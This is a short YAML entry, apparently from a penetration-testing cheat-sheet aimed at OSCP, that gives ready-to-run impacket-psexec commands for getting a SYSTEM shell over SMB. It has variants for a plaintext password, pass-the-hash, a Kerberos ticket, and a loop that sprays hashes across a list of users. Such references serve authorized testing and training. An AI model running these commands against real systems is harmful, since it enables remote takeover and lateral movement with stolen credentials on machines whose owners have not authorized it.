---
variants:
  - label: creds
    command: |
      impacket-psexec $DOMAIN/$USER:$PASSWORD@$IP
  - label: hash
    command: |
      impacket-psexec -hashes :$HASH $DOMAIN/$USER@$IP
  - label: ticket
    command: |
      impacket-psexec -k -no-pass $DOMAIN/$USER@$IP
  - label: spray
    command: |
      paste users.txt hashes.txt | while IFS=$'\t' read -r user hash; do
        impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:$hash $DOMAIN/"$user"@$IP
      done
description: Get a SYSTEM shell via PSExec, by auth method.
os: [Linux]
category: [oscp, cli]
have: [hash, ticket]
service: [SMB]
phase: [Exploitation]
references:
  - https://github.com/fortra/impacket
---
